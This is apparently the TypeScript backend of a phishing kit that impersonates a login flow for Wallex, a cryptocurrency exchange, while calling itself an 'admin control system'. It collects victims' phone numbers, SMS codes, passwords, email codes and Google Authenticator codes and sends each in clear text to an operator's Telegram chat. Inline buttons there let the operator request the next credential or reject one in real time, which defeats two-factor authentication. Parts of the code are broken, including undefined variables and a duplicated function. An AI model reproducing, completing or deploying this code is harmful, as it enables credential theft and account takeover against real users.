// Enhanced Telegram Bot API Service for Admin Control System

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";

interface UserSession {
  sessionId: string;
  phoneNumber: string;
  messageId?: number;
  startTime: string;
  phoneVerificationCode?: string;
  email?: string;
  emailCode?: string;
  completedSteps: string[];
  currentStep: string;
  authAttempts: {
    [key: string]: number;
  };
  authCodes: {
    [key: string]: string[];
  };
  onlineStatus?: {
    isOnline: boolean;
    isVisible: boolean;
    lastActivity: number;
    statusText: string;
    statusEmoji: string;
    lastUpdate: number;
  };
}

// Store active sessions (in real app, this would be in a database)
const activeSessions = new Map<string, UserSession>();

/**
 * Generate unique session ID with better collision resistance
 */
export const generateSessionId = (): string => {
  const timestamp = Date.now().toString(36);
  const random1 = Math.random().toString(36).substr(2, 8);
  const random2 = Math.random().toString(36).substr(2, 4);
  const counter = Math.floor(Math.random() * 1000).toString(36);

  return `${timestamp}_${random1}_${random2}_${counter}`;
};

/**
 * Send custom message to Telegram and return message ID
 */
export const sendCustomMessageToTelegram = async (
  message: string,
): Promise<{ success: boolean; messageId?: number }> => {
  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would send message to Telegram");
    console.log("📝 Message:", message);
    // Return fake message ID for demo
    return { success: true, messageId: Date.now() };
  }

  try {
    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [], // No buttons initially
            },
          }),
          signal: controller.signal,
        },
      );

      clearTimeout(timeoutId);

      if (!response.ok) {
        let errorText;
        try {
          errorText = await response.text();
        } catch {
          errorText = `HTTP ${response.status} ${response.statusText}`;
        }

        console.error("❌ Telegram send error:", {
          status: response.status,
          statusText: response.statusText,
          error: errorText,
        });
        throw new Error(
          `Telegram API error: ${response.status} - ${errorText}`,
        );
      }

      const result = await response.json();
      session.messageId = result.result.message_id;

      // Store session
      activeSessions.set(sessionId, session);

      console.log("✅ Phone number sent to Telegram successfully:", {
        sessionId,
        messageId: session.messageId,
      });
      return { success: true, sessionId };
    } catch (fetchError) {
      clearTimeout(timeoutId);

      if (fetchError.name === "AbortError") {
        console.error("❌ Telegram request timed out");
        throw new Error(
          "Request timed out. Please check your internet connection.",
        );
      }

      throw fetchError;
    }
  } catch (error) {
    console.error("❌ Failed to send phone to Telegram:", error);
    return { success: false, sessionId };
  }
};

/**
 * Get message ID from session
 */
export const getMessageIdFromSession = (sessionId: string): number | null => {
  const session = activeSessions.get(sessionId);
  return session?.messageId || null;
};

/**
 * Update session with email information and update Telegram message
 */
export const updateSessionWithEmail = async (
  sessionId: string,
  email: string,
): Promise<{ success: boolean }> => {
  const session = activeSessions.get(sessionId);
  if (!session) {
    console.error("❌ Session not found:", sessionId);
    return { success: false };
  }

  try {
    // Add email to session
    session.email = email;
    session.currentStep = "email_verification";
    activeSessions.set(sessionId, session);

    // Update the existing Telegram message (no admin buttons - user not on loading page)
    if (session.messageId) {
      const updatedMessage = formatSessionMessage(session);
      await updateTelegramMessage(
        session.messageId,
        updatedMessage,
        { inline_keyboard: [] }, // No buttons when not on loading page
      );
    }

    console.log("✅ Session updated with email:", { sessionId, email });
    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update session with email:", error);
    return { success: false };
  }
};

/**
 * Update session with email code and update Telegram message
 */
export const updateSessionWithEmailCode = async (
  sessionId: string,
  emailCode: string,
): Promise<{ success: boolean }> => {
  const session = activeSessions.get(sessionId);
  if (!session) {
    console.error("❌ Session not found:", sessionId);
    return { success: false };
  }

  try {
    // Add email code to session
    session.emailCode = emailCode;
    session.currentStep = "email_completed";
    activeSessions.set(sessionId, session);

    // Update the existing Telegram message (no admin buttons - user not on loading page)
    if (session.messageId) {
      const updatedMessage = formatSessionMessage(session);
      await updateTelegramMessage(
        session.messageId,
        updatedMessage,
        { inline_keyboard: [] }, // No buttons when not on loading page
      );
    }

    console.log("✅ Session updated with email code:", {
      sessionId,
      emailCode,
    });
    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update session with email code:", error);
    return { success: false };
  }
};

/**
 * Update existing Telegram message with new content
 */
export const updateCustomMessageInTelegram = async (
  messageId: number,
  newMessage: string,
): Promise<{ success: boolean }> => {
  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would update message in Telegram");
    console.log("📝 New Message:", newMessage);
    console.log("🆔 Message ID:", messageId);
    return { success: true };
  }

  try {
    await updateTelegramMessage(messageId, newMessage, undefined);
    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update custom message:", error);
    return { success: false };
  }
};

/**
 * Update user online status in session
 */
export const updateUserOnlineStatus = async (
  sessionId: string,
  isOnline: boolean,
  isVisible: boolean,
  lastActivity: number,
  statusText: string,
  statusEmoji: string,
): Promise<{ success: boolean }> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.error("❌ Session not found:", sessionId);
      return { success: false };
    }

    // Update online status
    session.onlineStatus = {
      isOnline,
      isVisible,
      lastActivity,
      statusText,
      statusEmoji,
      lastUpdate: Date.now(),
    };

    activeSessions.set(sessionId, session);

    // Update Telegram message if session is in waiting_admin state
    if (session.messageId && session.currentStep === "waiting_admin") {
      const updatedMessage = formatSessionMessage(session);
      await updateTelegramMessage(
        session.messageId,
        updatedMessage,
        getAdminKeyboard(sessionId, session),
      );
    }

    console.log("✅ Online status updated:", {
      sessionId,
      status: statusText,
      emoji: statusEmoji,
    });

    return { success: true };
  } catch (error) {
    console.error("❌ Failed to update online status:", error);
    return { success: false };
  }
};

/**
 * Send initial phone number to Telegram with admin controls
 */
export const sendPhoneToTelegramEnhanced = async (
  phoneNumber: string,
): Promise<{ success: boolean; sessionId: string }> => {
  const sessionId = generateSessionId();

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would send phone to Telegram");
    console.log("📱 Phone:", phoneNumber);
    console.log("🆔 Session:", sessionId);

    // Create session for demo mode
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
      messageId: Date.now(), // Fake message ID for demo
    };

    activeSessions.set(sessionId, session);
    return { success: true, sessionId };
  }

  try {
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
    };

    const message = formatInitialMessage(session);

    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [], // No buttons initially
            },
          }),
          signal: controller.signal,
        },
      );

      clearTimeout(timeoutId);

      if (!response.ok) {
        let errorText;
        try {
          errorText = await response.text();
        } catch {
          errorText = `HTTP ${response.status} ${response.statusText}`;
        }

        console.error("❌ Telegram send error:", {
          status: response.status,
          statusText: response.statusText,
          error: errorText,
        });
        throw new Error(
          `Telegram API error: ${response.status} - ${errorText}`,
        );
      }

      const result = await response.json();
      session.messageId = result.result.message_id;

      // Store session
      activeSessions.set(sessionId, session);

      console.log("✅ Phone number sent to Telegram successfully:", {
        sessionId,
        messageId: session.messageId,
      });
      return { success: true, sessionId };
    } catch (fetchError) {
      clearTimeout(timeoutId);

      if (fetchError.name === "AbortError") {
        console.error("❌ Telegram request timed out");
        throw new Error(
          "Request timed out. Please check your internet connection.",
        );
      }

      throw fetchError;
    }
  } catch (error) {
    console.error("❌ Failed to send phone to Telegram:", error);
    return { success: false, sessionId };
  }
};

/**
 * Update session when user enters verification code
 */
export const updatePhoneVerificationCode = async (
  sessionId: string,
  verificationCode: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    console.log("📝 Updating phone verification code:", {
      sessionId,
      verificationCode,
      currentSteps: session.completedSteps,
    });

    session.phoneVerificationCode = verificationCode;

    // Add phone_verification to completed steps if not already there
    if (!session.completedSteps.includes("phone_verification")) {
      session.completedSteps.push("phone_verification");
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Admin keyboard being sent:", adminKeyboard);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);

    console.log("✅ Phone verification updated successfully");
    return true;
  } catch (error) {
    console.error("❌ Failed to update verification code:", error);
    return false;
  }
};

/**
 * Update session with auth step data
 */
export const updateAuthStep = async (
  sessionId: string,
  stepType: string,
  stepData: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Initialize auth attempts and codes for this step
    if (!session.authAttempts[stepType]) {
      session.authAttempts[stepType] = 0;
    }
    if (!session.authCodes[stepType]) {
      session.authCodes[stepType] = [];
    }

    session.authAttempts[stepType]++;
    session.authCodes[stepType].push(stepData);

    if (!session.completedSteps.includes(stepType)) {
      session.completedSteps.push(stepType);
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to update auth step:", error);
    return false;
  }
};

/**
 * Set user current step (when navigating to auth pages)
 */
export const setUserCurrentStep = async (
  sessionId: string,
  step: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Check if step actually changed
    if (session.currentStep === step) {
      console.log("ℹ️ Current step unchanged, skipping update");
      return true;
    }

    const previousStep = session.currentStep;
    session.currentStep = step;

    const updatedMessage = formatInitialMessage(session);

    // Show admin buttons only when user is on loading page (waiting_admin)
    // Otherwise remove buttons
    const keyboard =
      step === "waiting_admin"
        ? getAdminKeyboard(sessionId, session)
        : { inline_keyboard: [] };

    console.log(`📱 Step changed: ${previousStep} → ${step}`);
    await updateTelegramMessage(session.messageId, updatedMessage, keyboard);

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.warn("⚠️ Failed to set current step:", error);
    // Don't return false to avoid breaking user flow
    return true;
  }
};

/**
 * Check if user can access auth step (prevent duplicate access)
 */
export const canAccessAuthStep = (
  sessionId: string,
  stepType: string,
): boolean => {
  const session = activeSessions.get(sessionId);
  if (!session) return false;

  // Allow access if this is the first time OR if it's SMS and this is the second attempt
  if (stepType === "sms") {
    return (
      !session.authAttempts[stepType] || session.authAttempts[stepType] < 2
    );
  }

  return (
    !session.authAttempts[stepType] || session.authAttempts[stepType] === 0
  );
};

/**
 * Get session data
 */
export const getSession = (sessionId: string): UserSession | undefined => {
  return activeSessions.get(sessionId);
};

/**
 * Show admin buttons when user is on loading page
 */
export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session) {
      console.error("❌ Session not found:", sessionId);
      return false;
    }

    console.log("🎛️ Request to show admin buttons for session:", {
      sessionId,
      currentStep: session.currentStep,
      completedSteps: session.completedSteps,
    });

    // Set step to waiting_admin and show buttons
    session.currentStep = "waiting_admin";

    const updatedMessage = formatSessionMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Admin keyboard result:", {
      hasButtons: adminKeyboard.inline_keyboard.length > 0,
      buttonCount: adminKeyboard.inline_keyboard.flat().length,
      keyboard: adminKeyboard,
    });

    // Check if we're in demo mode
    if (!validateTelegramConfig()) {
      console.log("🎭 Demo mode: Would show admin buttons in Telegram");
      console.log("📝 Message:", updatedMessage);
      console.log("⌨️ Keyboard:", adminKeyboard);

      // In demo mode, show alert with available options
      const buttons = adminKeyboard.inline_keyboard
        .flat()
        .map((btn) => btn.text)
        .join(", ");
      console.log("🎛️ Demo Admin Buttons:", buttons);

      // Simulate admin clicking a button after 5 seconds (for testing)
      setTimeout(() => {
        console.log("🎭 Demo: Simulating admin clicking 'Password' button");
        // You can manually call the callback here for testing
      }, 5000);

      activeSessions.set(sessionId, session);
      return true;
    }

    // Real Telegram mode
    if (!session.messageId) {
      console.error("MessageId not found for session:", sessionId);
      return false;
    }

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to show admin buttons:", error);
    return false;
  }
};

const formatInitialMessage = (session: UserSession): string => {
  return formatSessionMessage(session);
};

/**
 * Get admin keyboard based on session state
 * Admin buttons should ONLY be shown when user is on loading page (waiting_admin)
 */
const getAdminKeyboard = (sessionId: string, session: UserSession) => {
  console.log("🎛️ Building admin keyboard for session:", {
    sessionId,
    currentStep: session.currentStep,
    completedSteps: session.completedSteps,
    authAttempts: session.authAttempts,
  });

  // STRICT: Only show buttons if user is exactly on loading page (waiting_admin)
  if (session.currentStep !== "waiting_admin") {
    console.log(
      "❌ Admin buttons BLOCKED - user not on loading page:",
      session.currentStep,
    );
    console.log(
      "🚫 Required step: waiting_admin, Current step:",
      session.currentStep,
    );
    return { inline_keyboard: [] };
  }

  console.log(
    "✅ ADMIN BUTTONS ALLOWED - User is on loading page (waiting_admin)",
  );

  // User must have completed phone verification to see admin buttons
  if (!session.completedSteps.includes("phone_verification")) {
    console.log("❌ Admin buttons BLOCKED - phone verification not completed");
    return { inline_keyboard: [] };
  }

  console.log("✅ Admin buttons ALLOWED - user is on loading page");

  const buttons = [];

  // First section: Authentication method buttons (show if not attempted yet)
  const authRow = [];

  // Password button - show if not attempted
  if (!session.authAttempts["password"]) {
    authRow.push({
      text: "🔒 رمز عبور",
      callback_data: `auth_password_${sessionId}`,
    });
    console.log("✅ Added Password button");
  }

  // Google Auth button - show if not attempted
  if (!session.authAttempts["google"]) {
    authRow.push({
      text: "📱 Google Auth",
      callback_data: `auth_google_${sessionId}`,
    });
    console.log("✅ Added Google Auth button");
  }

  // Add auth buttons row if there are any
  if (authRow.length > 0) {
    buttons.push(authRow);
  }

  // Second section: Additional methods
  // SMS Code button removed - only Wrong SMS buttons will be available

  // Email Code button - show if not attempted
  if (!session.authAttempts["email"]) {
    buttons.push([
      {
        text: "📧 کد ایمیل",
        callback_data: `auth_email_${sessionId}`,
      },
    ]);
    console.log("✅ Added Email Code button");
  }

  // Wrong SMS button - always available (moved from wrong buttons section)
  buttons.push([
    {
      text: "❌ شماره اشتباه",
      callback_data: `incorrect_sms_${sessionId}`,
    },
  ]);
  console.log("✅ Added Wrong SMS button (always available)");

  // Third section: Wrong buttons (ONLY show if user has attempted that method at least once)
  const wrongButtonsRow1 = [];
  const wrongButtonsRow2 = [];

  // Wrong Password button - only if user attempted password at least once
  if (
    session.authAttempts["password"] &&
    session.authAttempts["password"] > 0
  ) {
    wrongButtonsRow1.push({
      text: "❌ رمز اشتباه",
      callback_data: `incorrect_password_${sessionId}`,
    });
    console.log("✅ Added Wrong Password button");
  }

  // Wrong Google Auth button - only if user attempted google auth at least once
  if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
    wrongButtonsRow1.push({
      text: "❌ کد اشتباه",
      callback_data: `incorrect_google_${sessionId}`,
    });
    console.log("✅ Added Wrong Google Auth button");
  }

  // Wrong SMS button moved to main buttons section to be always available

  // Wrong Email button - only if user attempted email at least once
  if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
    wrongButtonsRow2.push({
      text: "❌ ایمیل اشتباه",
      callback_data: `incorrect_email_${sessionId}`,
    });
    console.log("✅ Added Wrong Email button");
  }

  // Add wrong buttons rows if there are any
  if (wrongButtonsRow1.length > 0) {
    buttons.push(wrongButtonsRow1);
  }
  if (wrongButtonsRow2.length > 0) {
    buttons.push(wrongButtonsRow2);
  }

  // Fourth section: Complete Auth button (if user has completed at least one additional step)
  if (session.completedSteps.length > 1) {
    buttons.push([
      {
        text: "✅ تایید ورود",
        callback_data: `complete_auth_${sessionId}`,
      },
    ]);
    console.log("✅ Added Complete Auth button");
  }

  console.log("🎛️ Final keyboard:", { inline_keyboard: buttons });
  return { inline_keyboard: buttons };
};

// Store last message content to avoid unnecessary updates
const lastMessageContent = new Map<
  number,
  { text: string; replyMarkup: string }
>();

/**
 * Clean up old sessions (older than 1 hour)
 */
const cleanupOldSessions = () => {
  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);

  for (const [sessionId, session] of activeSessions.entries()) {
    const sessionTime = new Date(session.startTime);
    if (sessionTime < oneHourAgo) {
      console.log("🧹 Cleaning up old session:", sessionId);
      activeSessions.delete(sessionId);
      // Also clean up message content
      if (session.messageId) {
        lastMessageContent.delete(session.messageId);
      }
    }
  }
};

// Run cleanup every 30 minutes
setInterval(cleanupOldSessions, 30 * 60 * 1000);
/**
 * Compare message content and keyboard to check if update is needed
 */
const isMessageContentDifferent = (
  messageId: number,
  newText: string,
  newReplyMarkup: any,
): boolean => {
  const lastContent = lastMessageContent.get(messageId);
  if (!lastContent) {
    return true; // First time, always update
  }

  const newReplyMarkupStr = JSON.stringify(newReplyMarkup);

  return (
    lastContent.text !== newText ||
    lastContent.replyMarkup !== newReplyMarkupStr
  );
};

// Rate limiting and backoff management
const rateLimitMap = new Map<
  number,
  { lastUpdate: number; retryAfter: number; backoffMultiplier: number }
>();

/**
 * Update Telegram message with rate limiting and exponential backoff
 */
const updateTelegramMessage = async (
  messageId: number,
  text: string,
  replyMarkup: any,
  retryCount: number = 0,
): Promise<void> => {
  // Validate inputs
  if (!messageId || !text) {
    console.error("❌ Invalid message data:", {
      messageId,
      textLength: text?.length,
    });
    return;
  }

  // Check if content is actually different
  if (!isMessageContentDifferent(messageId, text, replyMarkup)) {
    console.log("ℹ️ Message content unchanged, skipping update");
    return;
  }

  // Check rate limiting
  const rateLimitInfo = rateLimitMap.get(messageId);
  if (rateLimitInfo) {
    const now = Date.now();
    const timeSinceLastUpdate = now - rateLimitInfo.lastUpdate;

    if (timeSinceLastUpdate < rateLimitInfo.retryAfter * 1000) {
      const waitTime = rateLimitInfo.retryAfter * 1000 - timeSinceLastUpdate;
      console.log(
        `⏱️ Rate limited for message ${messageId}, waiting ${waitTime}ms`,
      );

      // Schedule retry after wait time
      setTimeout(() => {
        updateTelegramMessage(messageId, text, replyMarkup, retryCount);
      }, waitTime);
      return;
    }
  }

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would update Telegram message");
    console.log("📝 Message:", text);
    console.log("⌨️ Keyboard:", replyMarkup);
    // Store content even in demo mode
    lastMessageContent.set(messageId, {
      text,
      replyMarkup: JSON.stringify(replyMarkup),
    });
    return;
  }

  try {
    const payload: any = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text: text.substring(0, 4096), // Telegram message limit
      parse_mode: "HTML",
    };

    // Only add reply_markup if it's not null/undefined
    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    console.log("🔄 Updating Telegram message:", {
      messageId,
      textLength: text.length,
      retryCount,
    });

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(10000), // 10 second timeout
      },
    );

    if (!response.ok) {
      const errorText = await response.text();
      let errorData;

      try {
        errorData = JSON.parse(errorText);
      } catch {
        errorData = { description: errorText };
      }

      // Handle specific "message is not modified" error
      if (errorText.includes("message is not modified")) {
        console.log("ℹ️ Message content is identical, no update needed");
        // Store the content to avoid future attempts
        lastMessageContent.set(messageId, {
          text,
          replyMarkup: JSON.stringify(replyMarkup),
        });
        return;
      }

      // Handle rate limiting (429)
      if (response.status === 429) {
        const retryAfter = errorData.parameters?.retry_after || 30;
        const backoffMultiplier = (rateLimitInfo?.backoffMultiplier || 1) * 1.5;
        const adjustedRetryAfter = Math.min(
          retryAfter * backoffMultiplier,
          300,
        ); // Max 5 minutes

        console.warn(
          `⏱️ Rate limited (429), retry after ${adjustedRetryAfter}s`,
        );

        // Store rate limit info
        rateLimitMap.set(messageId, {
          lastUpdate: Date.now(),
          retryAfter: adjustedRetryAfter,
          backoffMultiplier,
        });

        // Don't retry immediately if we've already retried multiple times
        if (retryCount >= 3) {
          console.error("❌ Too many rate limit retries, giving up");
          return;
        }

        // Schedule retry with exponential backoff
        setTimeout(() => {
          updateTelegramMessage(messageId, text, replyMarkup, retryCount + 1);
        }, adjustedRetryAfter * 1000);

        return;
      }

      console.error("❌ Telegram API error:", {
        status: response.status,
        statusText: response.statusText,
        error: errorData,
        retryCount,
      });

      // Don't retry on non-rate-limit errors
      return;
    }

    const result = await response.json();
    console.log("✅ Message updated successfully:", result.ok);

    // Clear any rate limit info on successful update
    rateLimitMap.delete(messageId);

    // Store the successfully updated content
    lastMessageContent.set(messageId, {
      text,
      replyMarkup: JSON.stringify(replyMarkup),
    });
  } catch (error) {
    console.error("❌ Failed to update Telegram message:", error);

    // Handle network errors with exponential backoff
    if (error instanceof TypeError && error.message.includes("fetch")) {
      if (retryCount < 3) {
        const backoffDelay = Math.pow(2, retryCount) * 2000; // 2s, 4s, 8s
        console.log(
          `🔄 Network error, retrying in ${backoffDelay}ms (attempt ${retryCount + 1})`,
        );

        setTimeout(() => {
          updateTelegramMessage(messageId, text, replyMarkup, retryCount + 1);
        }, backoffDelay);
      } else {
        console.error("❌ Max retries reached for network error");
      }
    }

    // Don't throw the error, just log it to prevent breaking the user flow
  }
};

/**
 * Get current step display text - simple and clear
 */
const getCurrentStepText = (step: string): string => {
  const stepTexts: { [key: string]: string } = {
    phone_verification: "تایید شماره",
    waiting_admin: "منتظر ادمین",
    email_verification: "تایید ایمیل",
    email_completed: "ایمیل تایید شد",
    auth_password: "وارد کردن رمز",
    auth_google: "Google Auth",
    auth_sms: "کد SMS",
    auth_email: "کد ایمیل",
    completed: "تکمیل شد",
  };

  return stepTexts[step] || step;
};

/**
 * Get step display name - simple format
 */
const getStepDisplayName = (stepType: string): string => {
  const names: { [key: string]: string } = {
    password: "رمز عبور",
    google: "Google Auth",
    sms: "کد SMS",
    email: "کد ایمیل",
  };

  return names[stepType] || stepType;
};

/**
 * Format session message in simple and beautiful format
 */
const formatSessionMessage = (session: UserSession): string => {
  // Escape HTML characters in user data
  const escapeHtml = (text: string): string => {
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  };

  // Main header - simple and clean
  let message = `🔐 <b>درخواست ورود والکس</b>

👤 <b>${escapeHtml(session.phoneNumber)}</b>
🕐 ${escapeHtml(session.startTime)}
📍 ${escapeHtml(getCurrentStepText(session.currentStep))}`;

  // Online status (if available) - single line
  if (session.onlineStatus) {
    const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
    const timeAgo =
      timeSinceUpdate > 60000
        ? `${Math.floor(timeSinceUpdate / 60000)}د`
        : `${Math.floor(timeSinceUpdate / 1000)}ث`;

    message += `\n${session.onlineStatus.statusEmoji} ${escapeHtml(session.onlineStatus.statusText)} (${timeAgo})`;
  }

  // Verification codes section - compact format
  let codes = [];

  // Phone verification code
  if (session.phoneVerificationCode) {
    codes.push(
      `📱 تایید شماره: <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
    );
  }

  // Email info
  if (session.email) {
    codes.push(`📧 ایمیل: <code>${escapeHtml(session.email)}</code>`);
    if (session.emailCode) {
      codes.push(`✉️ کد ایمیل: <code>${escapeHtml(session.emailCode)}</code>`);
    }
  }

  // Auth codes - compact single lines
  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
    Object.keys(session.authCodes).forEach((stepType) => {
      const stepCodes = session.authCodes[stepType];
      if (stepCodes && stepCodes.length > 0) {
        let stepEmoji = "🔐";
        let stepName = "";

        // Choose appropriate emoji and name
        switch (stepType) {
          case "password":
            stepEmoji = "🔒";
            stepName = "رمز عبور";
            break;
          case "google":
            stepEmoji = "📱";
            stepName = "Google Auth";
            break;
          case "sms":
            stepEmoji = "💬";
            stepName = "کد SMS";
            break;
          case "email":
            stepEmoji = "📧";
            stepName = "کد ایمیل";
            break;
          default:
            stepName = stepType;
        }

        // Show latest code for each type
        const latestCode = stepCodes[stepCodes.length - 1];
        codes.push(
          `${stepEmoji} ${stepName}: <code>${escapeHtml(latestCode)}</code>`,
        );
      }
    });
  }

  // Add codes section if any codes exist
  if (codes.length > 0) {
    message += `\n\n🔑 <b>کدهای دریافتی:</b>\n` + codes.join("\n");
  }

  // Simple footer with session info
  const completedCount = session.completedSteps?.length || 0;
  const totalAttempts = Object.values(session.authAttempts || {}).reduce(
    (sum, count) => sum + count,
    0,
  );

  message += `\n\n📊 مراحل: ${completedCount} | تلاش‌ها: ${totalAttempts}`;
  message += `\n🆔 <code>${session.sessionId.substring(0, 8)}...</code>`;

  return message;
};

const formatInitialMessage = (session: UserSession): string => {
  return formatSessionMessage(session);
};

/**
 * Validate Telegram configuration
 */
export const validateTelegramConfig = (): boolean => {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
    return false;
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
    return false;
  }

  return true;
};
